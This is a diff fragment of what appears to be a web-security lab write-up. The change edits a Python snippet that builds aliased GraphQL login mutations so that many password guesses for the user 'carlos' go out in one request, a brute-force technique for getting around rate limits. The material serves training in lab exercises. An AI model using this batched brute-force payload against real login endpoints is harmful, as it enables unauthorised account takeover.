@@ -583,15 +583,16 @@ passwords = "123456,password,12345678,qwerty".split(',')
 mutations = []
 for index, element in enumerate(passwords):
     mutation = (
-        f"bruteforce{index}: login(input: {{{{ password: \"{element}\", username: \"carlos\" }}}}) {{\n"
+        f"bruteforce{index}: login(input: {{ password: \"{element}\", username: \"carlos\" }}) {{\n"
         "    token\n"
         "    success\n"
         "}\n"
     )
     mutations.append(mutation)
 
-query = "\n".join(mutations)
+query = "{% raw %}\n" + "\n".join(mutations) + "\n{% endraw %}"
 print(query)
+
 
 
 ```
@@ -678,6 +679,7 @@ Store and deliver to victum and lab is solved
 
 
 ---
+
 
 
 
